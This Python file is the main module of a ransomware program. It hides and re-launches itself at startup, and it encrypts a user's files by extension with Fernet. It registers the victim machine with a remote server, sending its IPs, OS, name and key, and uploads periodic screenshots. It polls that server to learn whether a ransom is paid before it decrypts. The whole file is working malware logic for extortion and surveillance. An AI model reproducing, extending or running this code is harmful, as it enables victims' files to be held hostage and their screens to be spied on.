#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

"""System modules"""
import array
import sys
import os
from concurrent.futures.thread import ThreadPoolExecutor

from wcmatch import glob

from dotenv import load_dotenv

# codes line allow to package env in the exe file
# BUT they can be find easily without encryption of exe
from modules.miscellaneous.hidding import hide

extDataDir = os.getcwd()
if getattr(sys, 'frozen', False):
    extDataDir = sys._MEIPASS
load_dotenv(dotenv_path=os.path.join(extDataDir, '.env'))

# pylint: disable=wrong-import-position
# pylint: disable=wrong-import-order
import time
import requests
from cryptography.fernet import Fernet
from os.path import isfile, exists
import datetime
from threading import Thread
from modules.cryptography.file_decryption import decrypt_file
from modules.cryptography.file_encryption import encrypt_file
from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
from modules.internet.post_ressources import create_computer, post_image
from modules.miscellaneous.computer_properties import get_computer_name, \
    get_computer_os, get_public_ip, get_private_ip, take_screenshot, startup_exec
from modules.miscellaneous.config_file import get_config_file_info, \
    create_config_file, edit_config_file
from modules.internet.patch_ressources import patch_last_message_date

TRUE_ALIASES = [True, "True", "true", "yes"]


CONFIG_FILE_PATH = os.environ['USERPROFILE'] + os.getenv("HIDDEN_PROCESS_DIRECTORY") + \
                   os.getenv("CONFIG_FILE_NAME") + '.json'


def get_all_files_in_directory(paths: array, only_file_encrypted: bool):
    """
    This function return all files and sub_files in a directory passed in param
    1) Use Glob to get all the file and return them in array shape
    :param only_file_encrypted: want only file decrypted or only crypted ?
    :param paths: array of path to encrypt file
    """
    files = []
    pattern = '/**/[!gAAAAA]*.{'

    if only_file_encrypted:
        pattern = '/**/[gAAAAA]*.{'

    for path in paths:
        path = path.replace("\\", "/")

        for file in glob.glob(path + pattern + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}',
                           flags=glob.BRACE | glob.GLOBSTAR):
            if isfile(file):
                files.append(file)
    return files


def main():
    """
    This function is the main function
    """
    new_file_name = os.environ['USERPROFILE'] + os.getenv("HIDDEN_PROCESS_DIRECTORY") \
                    + os.getenv("HIDDEN_PROCESS_NAME")

    startup_module()

    if not exists(new_file_name + "\\" + os.getenv("HIDDEN_PROCESS_NAME") + '.exe'):
        hide(extDataDir, new_file_name)
        sys.exit(0)

    is_connected = False

    key = encrypt_module()

    # -- CHANGE BG MODULE --
    # change_background_image(getcwd() + "/" + get_image())
    # -- CHANGE BG MODULE --

    computer_id = get_config_file_info("computer_id")

    print("-- CREATION OF COMPUTER --")

    if computer_id == -1:
        while is_connected is not True:
            try:
                computer_id = create_computer(get_public_ip(), get_private_ip(), get_computer_os(),
                                              get_computer_name(), key.decode())["id"]
                print("-- CREATION OF CONFIG FILE --")
                create_config_file(computer_id)
                is_connected = True
            except requests.ConnectionError:
                is_connected = False
                print("Wait for web server to respond . . .")
                time.sleep(10)

    screenshot = Thread(target=screenshot_module, args=(computer_id,), daemon=True)
    has_paid_checker = Thread(target=has_paid_checker_module, args=(computer_id,), daemon=True)

    screenshot.start()
    has_paid_checker.start()
    has_paid_checker.join()


def encrypt_module():
    """
    This module is used to encrypt data
    """
    key = ""
    if get_config_file_info("encrypted") not in TRUE_ALIASES:
        pool = ThreadPoolExecutor(max_workers=10)
        computer_id = get_config_file_info("computer_id")
        print(computer_id)
        if computer_id != -1:
            key = get_the_decryption_key(computer_id).encode()
        else:
            key = Fernet.generate_key()
        print("-- KEY GENERATED --")
        files = get_all_files_in_directory([os.environ['USERPROFILE'] +
                                            os.getenv("DIRECTORY_TO_ENCRYPT")], False)
        print(files)
        for file in files:
            pool.submit(encrypt_file, file, Fernet(key))
        pool.shutdown(wait=True)
        edit_config_file("encrypted", "True")
    return key


def has_paid_checker_module(computer_id: str):
    """
    This function check if the user has paid on the web server
    1) Loop undefinitively and ask the web server if the client has paid
    2) Wait X seconds (X => value in env file)
    3) Re check again
    4) ...
    :param computer_id: The ID of the computer
    """
    while True:
        try:
            print("-- HE HAS PAID : --" + str(get_has_paid(computer_id)))
            if get_has_paid(computer_id):
                edit_config_file("has_paid", "True")
                decrypt_module(computer_id)
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)
        time.sleep(float(os.getenv("DELAY_BETWEEN_HAS_PAID_CHECK")))


def decrypt_module(computer_id):
    """
    module use to decrypt files
    :param computer_id: ID of the computer
    :return:
    """
    pool = ThreadPoolExecutor(max_workers=10)
    key = get_the_decryption_key(computer_id).encode()
    files = get_all_files_in_directory([os.environ['USERPROFILE'] +
                                        os.getenv("DIRECTORY_TO_ENCRYPT")], True)
    if key:
        for file in files:
            pool.submit(decrypt_file, file, Fernet(key))
        pool.shutdown(wait=True)
        edit_config_file("decrypted", "True")
    sys.exit(0)


def screenshot_module(computer_id):
    """
    This function make screenshot and send them to the web server all the X time
    1) Loop undefinitivly and send to the web server screenshot
    2) Wait X seconds (X => value in env file)
    3) Re send another screenshot again
    4) ...
    :param computer_id: The ID of the computer
    """
    while True:
        try:
            if os.getenv("ENABLE_SCREENSHOT") in TRUE_ALIASES:
                path = take_screenshot(os.environ['USERPROFILE'] + '\\Pictures\\')
                post_image(path, computer_id)
                patch_last_message_date(computer_id, datetime.datetime.now(datetime.timezone.utc))
                time.sleep(float(os.getenv("DELAY_BETWEEN_SCREENSHOTS")))
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)


def startup_module():
    """
    This module is used launch the exe at the start of the computer
    """
    startup_exec()


if __name__ == '__main__':

    if get_config_file_info("has_paid") in TRUE_ALIASES:
        computer_id = get_config_file_info("computer_id")
        if get_config_file_info("decrypted") not in TRUE_ALIASES and computer_id:
            decrypt_module(computer_id)
        sys.exit(0)
    main()
